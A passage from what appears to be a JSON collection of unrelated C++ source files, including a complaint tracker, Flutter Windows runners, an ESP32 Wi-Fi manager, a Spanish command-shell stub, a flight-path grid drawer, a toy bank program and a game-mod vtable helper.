date.Print();\n    std::cout << \"-------------------------\\n\";\n}\n\nStatus Complaint::GetStatus() {\n    return state;\n}\n\nint Complaint::getCID()\n{\n    return CID;\n}\n\nvoid Complaint::SetStatus(Status s)\n{\n    this->state = s;\n}\n\nstring Complaint::T_ID_getter() {\n    return teacher->getID();\n}\n\nDepartmentNames Complaint::getdept()\n{\n    return department->getDept();\n}\n\nstring Complaint::getdescription()\n{\n    return description;\n}\n\nvoid Complaint::Notify()\n{\n    teacher->AddNotification(this->CID);\n}\n\nvoid Complaint::setDate(Date& d)\n{\n    date = d;\n}\n\nstring Complaint::getMonth() \n{\n    return date.getMonth();\n}\n\nint Complaint::getYear() \n{\n    return date.getYear();\n}\n\nint Complaint::getDate() \n{\n    return date.getDate();\n}\n\nvoid Complaint::PrintIDandStatus()\n{\n    cout << \"Complaint ID: \" << CID << endl;\n    cout << \"Status: \" << StateTostring(state) << endl;\n}\n\nvoid Complaint::printDate_Status_Des()\n{\n    cout << \"Filed Date: \";\n    date.Print();\n    cout << \"Status: \" << StateTostring(state) << endl;\n    cout << \"Description: \" << description << endl;\n    std::cout << \"-------------------------\\n\";\n}\n\nvoid Complaint::PrintTeacher()\n{\n    std::cout << \"-------------------------\\n\";\n    cout << \"Initiated By: \"<<endl;\n    teacher->DisplayInfo();\n    std::cout << \"-------------------------\\n\";\n}\n\nstring Complaint::getdate()\n{\n    return date.getdate();\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"my_flutter_game\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n// Created by leona on 01/08/2024.\n//\n\n#include \"geom.h\"\n#include <vector>\n#include <array>\n#include <numeric>\n#include <bitset>\n#include <iostream>\n\n\nPoint::Point(const std::vector<double>& coord, int id) : id(id), coord(coord), dims(coord.size()) {}\n\n\nstd::pair<std::vector<std::vector<double>>, std::vector<std::vector<double>>> genmasks(int dims) {\n    std::vector<double> incr(dims, 0.5);\n    std::vector<std::vector<double>> pts(1, std::vector<double>(dims, 0.5));\n\n    // Generate points\n    for (int d = 0; d < dims; ++d) {\n        std::vector<std::vector<double>> lower = pts;\n        std::vector<std::vector<double>> higher = pts;\n        for (auto& p : lower) p[d] -= incr[d];\n        for (auto& p : higher) p[d] += incr[d];\n        pts.insert(pts.end(), lower.begin(), lower.end());\n        pts.insert(pts.end(), higher.begin(), higher.end());\n    }\n\n    // Calculate pts_mask\n    std::vector<std::vector<double>> pts_mask(pts.size(), std::vector<double>(dims));\n    for (size_t i = 0; i < pts.size(); ++i) {\n        for (int d = 0; d < dims; ++d) {\n            pts_mask[i][d] = (pts[i][d] - incr[d]) / incr[d];\n        }\n    }\n\n    // Generate mbr\n    std::vector<std::vector<std::array<double, 2>>> mbr(1 << dims, std::vector<std::array<double, 2>>(dims));\n    for (int quad = 0; quad < (1 << dims); ++quad) {\n        std::bitset<32> qbin(quad);\n        std::vector<double> child_mindim(dims);\n        std::vector<double> child_maxdim(dims);\n\n        for (int d = 0; d < dims; ++d) {\n            child_mindim[d] = qbin[d] ? 0.5 : 0.0;\n            child_maxdim[d] = qbin[d] ? 1.0 : 0.5;\n        }\n\n        for (int d = 0; d < dims; ++d) {\n            mbr[quad][d] = {child_mindim[d], child_maxdim[d]};\n        }\n    }\n\n    // Calculate nds_mask\n    std::vector<std::vector<double>> nds_mask(pts.size(), std::vector<double>(1 << dims, 0));\n    for (size_t p = 0; p < pts.size(); ++p) {\n        for (int n = 0; n < (1 << dims); ++n) {\n            bool match = true;\n            for (int d = 0; d < dims; ++d) {\n                if (pts[p][d] != mbr[n][d][0] && pts[p][d] != mbr[n][d][1]) {\n                    match = false;\n                    break;\n                }\n            }\n            if (match) {\n                nds_mask[p][n] = 1;\n            }\n        }\n    }\n\n    return {pts_mask, nds_mask};\n}\n",
    "/*\n * Copyright (c) 2024 Tomosawa\n * https://github.com/Tomosawa/\n * All rights reserved\n */\n#include \"WIFINetwork.h\"\n#include <Preferences.h>\n#include <ArduinoJson.h>\n\nWIFINetwork::WIFINetwork() : AP_local_ip(10, 0, 10, 1),  // IP\u5730\u5740\n                             AP_gateway(10, 0, 10, 1),   // \u7f51\u5173\u5730\u5740\n                             AP_subnet(255, 255, 255, 0) // \u5b50\u7f51\u63a9\u7801\n{\n    AP_ssid = \"MYNOVA\";\n    AP_password = \"MyNova123\";\n}\n\nvoid WIFINetwork::init()\n{\n    WiFi.mode(WIFI_AP_STA);\n    WiFi.softAPConfig(AP_local_ip, AP_gateway, AP_subnet);\n}\n\nvoid WIFINetwork::startAP()\n{\n    AP_State = WiFi.softAP(AP_ssid, AP_password);\n}\n\nvoid WIFINetwork::startWIFI()\n{\n    WiFi.begin(wifi_ssid, wifi_password); // \u8fde\u63a5WIFI\n}\n\nIPAddress WIFINetwork::getWIFIIP()\n{\n    return WiFi.localIP();\n}\n\nIPAddress WIFINetwork::getAPIP()\n{\n    return WiFi.softAPIP();\n}\n\nvoid WIFINetwork::reconnectWIFI()\n{\n    WiFi.reconnect();\n}\nvoid WIFINetwork::disconnectWIFI()\n{\n    WiFi.disconnect();\n}\nvoid WIFINetwork::disconnectAP()\n{\n    AP_State = !WiFi.softAPdisconnect();\n}\n\nwl_status_t WIFINetwork::getWIFIState()\n{\n    return WiFi.status();\n}\n\nString WIFINetwork::getWIFIStateInfo()\n{\n    String state;\n    switch (getWIFIState())\n    {\n    case WL_NO_SHIELD: // for compatibility with WiFi Shield library\n        state = \"NO_SHIELD\";\n        break;\n    case WL_IDLE_STATUS:\n        state = \"IDLE_STATUS\";\n        break;\n    case WL_NO_SSID_AVAIL:\n        state = \"NO_SSID_AVAIL\";\n        break;\n    case WL_SCAN_COMPLETED:\n        state = \"SCAN_COMPLETED\";\n        break;\n    case WL_CONNECTED:\n        state = \"CONNECTED\";\n        break;\n    case WL_CONNECT_FAILED:\n        state = \"CONNECT_FAILED\";\n        break;\n    case WL_CONNECTION_LOST:\n        state = \"CONNECTION_LOST\";\n        break;\n    case WL_DISCONNECTED:\n        state = \"DISCONNECTED\";\n        break;\n    default:\n        state = \"\";\n        break;\n    }\n    if (wifi_ssid.isEmpty())\n        state = \"NOT_CONFIG\";\n    return state;\n}\n\nvoid WIFINetwork::SaveConfig()\n{\n    Preferences prefs;\n    prefs.begin(\"MYNOVA\");\n\n    prefs.putString(\"WIFI_SSID\", wifi_ssid);\n    prefs.putString(\"WIFI_PASSWORD\", wifi_password);\n\n    prefs.end();\n}\n\nbool WIFINetwork::ReadConfig()\n{\n    Preferences prefs;\n    prefs.begin(\"MYNOVA\");\n\n    wifi_ssid = prefs.getString(\"WIFI_SSID\", \"\");\n    wifi_password = prefs.getString(\"WIFI_PASSWORD\", \"\");\n\n    prefs.end();\n\n    if (wifi_ssid.isEmpty())\n        return false;\n\n    return true;\n}\n\nString WIFINetwork::getAllSSIDJson()\n{\n    // \u5f00\u59cb\u626b\u63cf\u5468\u56f4\u7684Wi-Fi\u7f51\u7edc\n    // WiFi.scanNetworks(true);\n    // delay(2000);\n    int networksCount = WiFi.scanComplete();\n\n    JsonDocument doc;\n    doc[\"WIFI_SSID\"] = wifi_ssid;\n    doc[\"WIFI_PASSWORD\"] = wifi_password;\n    // \u521b\u5efaJsonArray\n    JsonArray networks = doc[\"WIFI_SCAN\"].to<JsonArray>();\n\n    // \u904d\u5386\u626b\u63cf\u7ed3\u679c\uff0c\u5e76\u5c06SSID\u6dfb\u52a0\u5230JSON\u6570\u7ec4\u4e2d\n    for (int i = 0; i < networksCount; ++i)\n    {\n        // \u6dfb\u52a0\u7b2c\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\n        JsonObject network = networks.add<JsonObject>();\n        network[\"SSID\"] = WiFi.SSID(i);\n    }\n    // \u5c06JSON\u6570\u636e\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    String jsonString;\n    serializeJson(doc, jsonString);\n    // \u8fd4\u56deJSON\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\n    return jsonString;\n}",
    "#include <cstring>\n#include <fstream>\n#include <iostream>\nusing namespace std;\n\n#include \"comp1.h\"\n\nvoid cargar(char *nombre_archivo) {\n    \n  if(nombre_archivo == nullptr){\n  \n    cout<<\"Error: el comando  esperaba un archivo existente como parametro\"<<endl;\n    return;\n    \n  }\n\n  cout << \"comando cargar\" << endl;\n  cout << \"Parametro:\" << nombre_archivo << endl;\n  ifstream entrada(nombre_archivo);\n\n  // Archivo vac\u00edo o incompleto\n  if (entrada.peek() == EOF /*|| incompleto*/) {\n    \n    cout << \"El archivo esta vacio o incompleto\" << endl;\n    return;\n    \n  }\n  // Archivo no existe\n  if (!entrada.is_open()) {\n    \n    printf(\"El archivo %s no existe o es ilegible\\n\", nombre_archivo);\n    return;\n    \n  }\n  // Objeto ya existe\n\n  // Resultado exitoso\n  \n}\n\nvoid listado() { cout << \"comando listado\" << endl; }\n\nvoid envolvente(char *nombre_objeto) {\n  \n  if (nombre_objeto == nullptr) {\n    \n    cout << \"comando envolvente sin param\" << endl;\n    \n  } else {\n    \n    cout << \"comando envolvente con param\" << endl;\n    cout << \"Parametro:\" << nombre_objeto << endl;\n    \n  }\n  \n}\n\nvoid descargar(char *nombre_objeto) {\n\n  if(nombre_objeto == nullptr){\n\n    cout<<\"Error: el comando esperaba un objeto existente como parametro\"<<endl;\n    return;\n    \n  }\n  \n  cout << \"comando descargar\" << endl;\n  cout << \"Parametro:\" << nombre_objeto << endl;\n  \n}\n\nvoid guardar(char *nombre_objeto, char *nombre_archivo) {\n  \n  if(nombre_objeto == nullptr || nombre_archivo == nullptr){\n\n    cout<<\"Error: el comando esperaba dos parametros\"<<endl;\n    return;\n    \n  }\n  \n  cout << \"comando guardar\" << endl;\n  cout << \"Parametro:\" << nombre_objeto << endl;\n  cout << \"Parametro:\" << nombre_archivo << endl;\n}\n\nvoid ayuda(char *param) {\n  if (param == nullptr) {\n\n    printf(\"Lista de comandos disponibles:\\n\"\n           \"\\tcargar\\n\"\n           \"\\tlistado\\n\"\n           \"\\tenvolvente\\n\"\n           \"\\tdescargar\\n\"\n           \"\\tguardar\\n\"\n           \"\\tsalir\\n\"\n           \"\\tv_cercano\\n\"\n           \"\\tv_cercano_caja\\n\"\n           \"\\truta_corta\\n\"\n           \"\\truta_corta_centro\\n\");\n\n  } else if (strcmp(param, \"cargar\") == 0) {\n\n    printf(\n        \"comando: cargar nombre_archivo\\n\"\n        \"descripci\u00f3n: Carga en memoria la informaci\u00f3n del objeto nombre_objeto \"\n        \"contenida en el archivo identificado por nombre_archivo.\\n\\n\"\n        \"Posibles salidas de pantalla:\\n\"\n        \"Archivo vac\u00edo o incompleto: El archivo nombre_archivo no contiene un \"\n        \"objeto 3D v\u00e1lido.\\n\"\n        \"Archivo no existe: El archivo nombre_archivo no existe o es \"\n        \"ilegible.\\n\"\n        \"Objeto ya existe: El objeto nombre_objeto ya ha sido cargado en \"\n        \"memoria\\n\"\n        \"Resultado exitoso: El objeto nombre_objeto ha sido cargado \"\n        \"exitosamente desde el archivo\\n\");\n\n  } else if (strcmp(param, \"listado\") == 0) {\n\n    printf(\"comando: listado\\n\"\n           \"descripci\u00f3n: Lista los objetos cargados actualmente en memoria, \"\n           \"junto con la informaci\u00f3n b\u00e1sica \"\n           \"de cada uno: cantidad de puntos, de aristas y de caras.\\n\\n\"\n           \"Posibles salidas de pantalla:\\n\"\n           \"Memoria vac\u00eda: Ningun objeto ha sido cargado en memoria.\\n\"\n           \"Resultado exitoso: Hay n objetos en memoria:\\n\"\n           \"nombre_objeto_1 contiene n_1 vertices, a_1 aristas y c_1 caras.\\n\"\n           \"nombre_objeto_2 contiene n_2 vertices, a_2 aristas y c_2 caras.\\n\"\n           \"...\\n\");\n\n  } else if (strcmp(param, \"envolvente\") == 0) {\n\n    printf(\"comando: envolvente nombre_objeto\\n\"\n           \"descripci\u00f3n: Calcula la caja envolvente del objeto identificado \"\n           \"por nombre_objeto. \"\n           \"La caja envolvente se agrega como un nuevo objeto en memoria, \"\n           \"asign\u00e1ndole autom\u00e1ticamente el \"\n           \"nombre env_nombre_objeto , para distinguirla de los dem\u00e1s objetos \"\n           \"en memoria.\\n\\n\"\n           \"Posibles salidas de pantalla:\\n\"\n           \"Resultado exitoso: La caja envolvente del objeto nombre_objeto se \"\n           \"ha generado con \"\n           \"el nombre env_nombre_objeto y se ha agregado a los objetos en \"\n           \"memoria.\\n\\n\");\n\n    printf(\n        \"comando: envolvente\\n\"\n        \"descripci\u00f3n: Calcula la caja envolvente que incluye a todos los \"\n        \"objetos cargados actualmente en memoria. \"\n        \"La caja envolvente se agrega como un nuevo objeto en memoria, \"\n        \"asign\u00e1ndole autom\u00e1ticamente el nombre env_global, \"\n        \"para distinguirla de los dem\u00e1s objetos en memoria.\\n\\n\"\n        \"Posibles salidas de pantalla:\\n\"\n        \"Memoria vac\u00eda: Ningun objeto ha sido cargado en memoria.\\n\"\n        \"Resultado exitoso:  La caja envolvente de los objetos en memoria se \"\n        \"ha generado con \"\n        \"el nombre env_global y se ha agregado a los objetos en memoria\\n\\n\");\n\n  } else if (strcmp(param, \"descargar\") == 0) {\n    cout << \"comando descargar\" << endl;\n\n    printf(\"comando: descargar nombre_objeto\\n\"\n           \"descripci\u00f3n: Descarga de la memoria toda la informa",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\n// Class to represent a point in 2D space\nclass Point {\npublic:\n    int x, y;\n    Point(int x, int y) : x(x), y(y) {}\n};\n\n// Class to represent a flight path\nclass Flight {\npublic:\n    vector<Point> path;\n};\n\n// Function to draw a line on a grid from a start point to an end point\nvoid drawLine(vector<vector<char>>& grid, const Point& start, const Point& end, char symbol) {\n    // Bresenham's line algorithm implementation\n    int dx = abs(end.x - start.x);\n    int dy = abs(end.y - start.y);\n    int sx = start.x < end.x ? 1 : -1;\n    int sy = start.y < end.y ? 1 : -1;\n    int err = dx - dy;\n    Point p = start;\n\n    while (true) {\n        grid[p.y][p.x] = symbol;\n        if (p.x == end.x && p.y == end.y) break;\n        int e2 = 2 * err;\n        if (e2 > -dy) {\n            err -= dy;\n            p.x += sx;\n        }\n        if (e2 < dx) {\n            err += dx;\n            p.y += sy;\n        }\n    }\n}\n\n// Function to draw the flight paths on a grid\nvoid drawFlightPaths(const vector<Flight>& flights) {\n    // Find the maximum x and y coordinates\n    int maxX = 0, maxY = 0;\n    for (const Flight& flight : flights) {\n        for (const Point& p : flight.path) {\n            maxX = max(maxX, p.x);\n            maxY = max(maxY, p.y);\n        }\n    }\n\n    // Create a grid with the maximum coordinates\n    vector<vector<char>> grid(maxY + 1, vector<char>(maxX + 1, '.'));\n\n    // Draw each flight path on the grid\n    char flightSymbol = 'A';\n    for (const Flight& flight : flights) {\n        for (size_t i = 0; i < flight.path.size() - 1; i++) {\n            Point start = flight.path[i];\n            Point end = flight.path[i + 1];\n            drawLine(grid, start, end, flightSymbol);\n        }\n        flightSymbol++;\n    }\n\n    // Print the grid\n    for (int y = maxY; y >= 0; --y) {\n        for (int x = 0; x <= maxX; ++x) {\n            cout << grid[y][x] << ' ';\n        }\n        cout << endl;\n    }\n}\n\nint main() {\n    // Get the number of flights from the user\n    vector<Flight> flights;\n    cout << \"Enter the number of flights: \";\n    int numFlights;\n    cin >> numFlights;\n    cin.ignore(); // Consume newline\n\n    // Get the coordinates for each flight\n    for (int i = 1; i <= numFlights; i++) {\n        cout << \"Enter coordinates for Flight \" << i << \" (x,y format, enter -1,-1 to finish):\" << endl;\n        Flight flight;\n        while (true) {\n            string input;\n            getline(cin, input);\n            if (input == \"-1,-1\") break;\n            size_t commaPos = input.find(',');\n            int x = stoi(input.substr(0, commaPos)) - 1;\n            int y = stoi(input.substr(commaPos + 1)) - 1;\n            flight.path.emplace_back(x, y);\n        }\n        flights.push_back(flight);\n    }\n\n    // Draw the flight paths\n    drawFlightPaths(flights);\n\n    return 0;\n}",
    "//Program is made by ebadmahar \r\n//github.com/ebadmahar\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <unordered_map>\r\n#include <sstream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nclass Database \r\n{\r\npublic:\r\n    Database() {\r\n        loadUsersFromFile();\r\n        loadManagersFromFile();\r\n    }\r\n\r\n    void saveUsersToFile() {\r\n        ofstream userFile(\"users.txt\");\r\n        for (const auto &user : users) {\r\n            userFile << user.first << \" \" << user.second.first << \" \" << user.second.second << endl;\r\n        }\r\n    }\r\n//Program is made by ebadmahar \r\n//github.com/ebadmahar\r\n    bool loadUsersFromFile() {\r\n        ifstream userFile(\"users.txt\");\r\n        if (!userFile) return false;\r\n        string line;\r\n        while (getline(userFile, line)) {\r\n            istringstream iss(line);\r\n            string username, password;\r\n            double balance;\r\n            if (iss >> username >> password >> balance) {\r\n                users[username] = make_pair(password, balance);\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    bool loadManagersFromFile() {\r\n        ifstream managerFile(\"managers.txt\");\r\n        if (!managerFile) return false;\r\n        string line;\r\n        while (getline(managerFile, line)) {\r\n            istringstream iss(line);\r\n            string username, password;\r\n            if (iss >> username >> password) {\r\n                managers[username] = password;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n//Program is made by ebadmahar \r\n//github.com/ebadmahar\r\n    bool usernameExists(const string &username) {\r\n        return users.find(username) != users.end();\r\n    }\r\n\r\n    void createUser(const string &username, const string &password) {\r\n        if (!usernameExists(username)) {\r\n            users[username] = make_pair(password, 0.0);\r\n            saveUsersToFile();\r\n            cout << \"User created successfully.\" << endl;\r\n        } else {\r\n            cout << \"Username already exists. Choose a different username.\" << endl;\r\n        }\r\n    }\r\n\r\n    void deleteUser(const string &username) {\r\n        users.erase(username);\r\n        saveUsersToFile();\r\n    }\r\n\r\n    void editUserBalance(const string &username, double newBalance) {\r\n        if (usernameExists(username)) {\r\n            users[username].second = newBalance;\r\n            saveUsersToFile();\r\n            cout << \"Balance updated successfully.\" << endl;\r\n        } else {\r\n            cout << \"User not found.\" << endl;\r\n        }\r\n    }\r\n\r\n    bool login() {\r\n        string username, password;\r\n        cout << \"Enter username: \";\r\n        cin >> username;\r\n        if (users.find(username) != users.end()) {\r\n            cout << \"Enter password: \";\r\n            cin >> password;\r\n            if (users[username].first == password) return true;\r\n        }\r\n        cout << \"Incorrect username or password. Try again.\" << endl;\r\n        return false;\r\n    }\r\n//Program is made by ebadmahar \r\n//github.com/ebadmahar\r\nprivate:\r\n    unordered_map<string, pair<string, double>> users;\r\n    unordered_map<string, string> managers;\r\n};\r\n\r\nclass Transaction {\r\npublic:\r\n    string type;\r\n    double amount;\r\n\r\n    Transaction(const string &t, double a) : type(t), amount(a) {}\r\n};\r\n\r\nclass BankAccount {\r\npublic:\r\n    BankAccount(const string &username, Database &db) : username(username), open(true), balance(0), database(db) {\r\n        ifstream file(\"users.txt\");\r\n        string line;\r\n        while (getline(file, line)) {\r\n            istringstream iss(line);\r\n            string storedUsername, storedPassword;\r\n            double storedBalance;\r\n            if (iss >> storedUsername >> storedPassword >> storedBalance) {\r\n                if (storedUsername == username) {\r\n                    balance = storedBalance;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    void Withdraw(double amount) {\r\n        if (open && amount <= balance && amount > 0) {\r\n            balance -= amount;\r\n            transactions.emplace_back(\"Withdrawal\", amount);\r\n            cout << \"Successfully withdrew $\" << amount << \" from your account.\" << endl;\r\n            cout << \"Your new balance is: \" << balance << endl;\r\n            updateBalanceInFile();\r\n        } else {\r\n            cout << \"Invalid amount provided or account is deactivated.\" << endl;\r\n        }\r\n    }\r\n\r\n    void Deposit(double amount) {\r\n        if (open && amount > 0) {\r\n            balance += amount;\r\n            transactions.emplace_back(\"Deposit\", amount);\r\n            cout << \"Successfully deposited $\" << amount << \" to your account.\" << endl;\r\n            cout << \"Your new balance is: \" << balance << endl;\r\n            updateBalanceInFile();\r\n        } else {\r\n            cout << \"Invalid amount provided or account is deactivated.\" << endl;\r\n        }\r\n    }\r\n\r\n    void PrintAccountSummary() {\r\n        cout << \"Account Holder: \" << username << endl;\r\n        cout << \"Balance: $\" << balance << endl;\r\n        cou",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"crud_operation1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <writer.hpp>\n#include <reader.hpp>\n#include <stream.hpp>\n\n//the cli module will contain the main function and the cli interface\n//it will be responsible for parsing the arguments and calling the appropriate functions\n//it will also contain the help message\n#include <iostream>\n#include <string>\n#include <vector>\n#include <fstream>\n#include <functions.hpp>\n#include <opcodes.hpp>\n#include <mem.hpp>\n\n//function to parse the arguments\n//usage: Crane [options] [input file] [output file]\n//options:\n//  -h, --help: show the help message\n//  -v, --version: show the version\n//  -r, --run: run the program\n//  -d, --debug: run the program in debug mode\n//  -c, --compile: compile the program\n//  -t, --test: run the tests\n//  -w, --write: write the output to the file\n//  -p, --print: print the output to the console\n//  -s, --step: step through the program\n//  -l, --list: list the instructions\n//  -i, --info: show the info\n//  -a, --assemble: assemble the program\n//  -b, --disassemble: disassemble the program\nvoid print_help() {\n    std::cout << \"Usage: Crane [options] [input file] [output file]\" << std::endl;\n    std::cout << \"Options:\" << std::endl;\n    std::cout << \"  -h, --help        Show the help message\" << std::endl;\n    std::cout << \"  -v, --version     Show the version\" << std::endl;\n    std::cout << \"  -r, --run         Run the program\" << std::endl;\n    std::cout << \"  -d, --debug       Run the program in debug mode\" << std::endl;\n    std::cout << \"  -c, --compile     Compile the program\" << std::endl;\n    std::cout << \"  -t, --test        Run the tests\" << std::endl;\n    std::cout << \"  -w, --write       Write the output to the file\" << std::endl;\n    std::cout << \"  -p, --print       Print the output to the console\" << std::endl;\n    std::cout << \"  -s, --step        Step through the program\" << std::endl;\n    std::cout << \"  -l, --list        List the instructions\" << std::endl;\n    std::cout << \"  -i, --info        Show the info\" << std::endl;\n    std::cout << \"  -a, --assemble    Assemble the program\" << std::endl;\n    std::cout << \"  -b, --disassemble Disassemble the program\" << std::endl;\n}\nvoid parse_args(int argc, char* argv[]) {\n    if (argc < 2) {\n        std::cout << \"Crane: missing file operand\" << std::endl;\n        std::cout << \"Try 'Crane --help' for more information.\" << std::endl;\n        print_help();\n        exit(1);\n    }\n\n    std::string arg = argv[1];\n\n    if (arg == \"-h\" || arg == \"--help\") {\n        print_help();\n        exit(0);\n    } else if (arg == \"-v\" || arg == \"--version\") {\n        std::cout << \"Crane version 0.1\" << std::endl;\n        exit(0);\n    } else if (arg == \"-r\" || arg == \"--run\") {\n        // run the program\n    } else if (arg == \"-d\" || arg == \"--debug\") {\n        // run the program in debug mode\n    } else if (arg == \"-c\" || arg == \"--compile\") {\n        // compile the program\n    } else if (arg == \"-t\" || arg == \"--test\") {\n        // run the tests\n    } else if (arg == \"-w\" || arg == \"--write\") {\n        // write the output to the file\n        if (argc < 4) {\n            std::cout << \"Crane: missing file operand\" << std::endl;\n            std::cout << \"Try 'Crane --help' for more information.\" << std::endl;\n            exit(1);\n        }\n        std::string input_file = argv[2];\n        std::string output_file = argv[3];\n        Stream stream = Stream(input_file);\n        stream.read();\n        Writer writer = Writer(output_file);\n        writer.write(stream);\n    } else if (arg == \"-p\" || arg == \"--print\") {\n        Stream stream = Stream(\"test.cb\");\n        stream.read();\n        stream.print();\n    } else if (arg == \"-s\" || arg == \"--step\") {\n        // step through the program\n    } else if (arg == \"-l\" || arg == \"--list\") {\n        // list the instructions\n    } else if (arg == \"-i\" || arg == \"--info\") {\n        // show the info\n    } else if (arg == \"-a\" || arg == \"--assemble\") {\n        // assemble the program\n    } else if (arg == \"-b\" || arg == \"--disassemble\") {\n        // disassemble the program\n    } else {\n        std::cout << \"Crane: invalid option -- '\" << arg << \"'\" << std::endl;\n        std::cout << \"Try 'Crane --help' for more information.\" << std::endl;\n        exit(1);\n    }\n}\n\n\n\nint main(int argc, char* argv[]) {\n    //write \\0 \\5\\ \\10 to test.cb\n    //open test.cb with fstream\n    auto file = std::fstream(\"test.cb\", std::ios::out | std::ios::binary);\n    file.write(\"\\0\\5\\10\", 3);\n    file.close();\n    parse_args(argc, argv);\n    return 0;\n}",
    "#include \"pe/Util/Type.h\"\n#include \"Game/Boss/DarkBowser.h\"\n#include \"Game/Enemy/ShadowMario.h\"\n#include \"Game/Enemy/ShadowRacer.h\"\n#include \"Game/MapObj/GoalItem.h\"\n#include \"Game/MapObj/JumpFlipPanel.h\"\n#include \"Game/MapObj/Shards.h\"\n#include \"Game/Npc/NekoNormal.h\"\n#include \"Game/Npc/NekoParent.h\"\n#include \"Game/Player/CourseSelectPlayerActor.h\"\n#include \"Game/Player/PlayerActor.h\"\n#include \"Game/Scene/PhaseBossScene.h\"\n\nnamespace pe {\nnamespace util {\n\n    template <>\n    bool checkTypeByVtable<PlayerActor>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x0137a038;\n    }\n\n    template <>\n    bool checkTypeByVtable<CourseSelectPlayerActor>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x0128a7d0;\n    }\n\n    template <>\n    bool checkTypeByVtable<GoalItem>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x01327de8;\n    }\n\n    template <>\n    bool checkTypeByVtable<ShadowMario>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x012cdbd0;\n    }\n\n    template <>\n    bool checkTypeByVtable<ShadowRacer>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x012ceae8;\n    }\n\n    template <>\n    bool checkTypeByVtable<Shards>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x01350388;\n    }\n\n    template <>\n    bool checkTypeByVtable<JumpFlipPanel>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x01333c40;\n    }\n\n    template <>\n    bool checkTypeByVtable<DarkBowser>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x0126db30;\n    }\n\n    template <>\n    bool checkTypeByVtable<NekoParent>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x01370380;\n    }\n\n    template <>\n    bool checkTypeByVtable<NekoNormal>(const al::LiveActor* actor)\n    {\n        return getVftOffsetMain(actor) == 0x0136f3b0;\n    }\n\n    template <>\n    bool checkTypeByVtable<PhaseBossScene>(const SingleModeScene* scene)\n    {\n        return getVftOffsetMain(scene) == 0x01386c50;\n    }\n\n    PlayerActor* checkPlayer(al::LiveActor* instance)\n    {\n        if (pe::util::checkTypeByVtable<PlayerActor>(instance) or pe::util::checkTypeByVtable<CourseSelectPlayerActor>(instance))\n            return static_cast<PlayerActor*>(instance);\n\n        return nullptr;\n    }\n\n} // namespace util\n} // namespace pe\n",
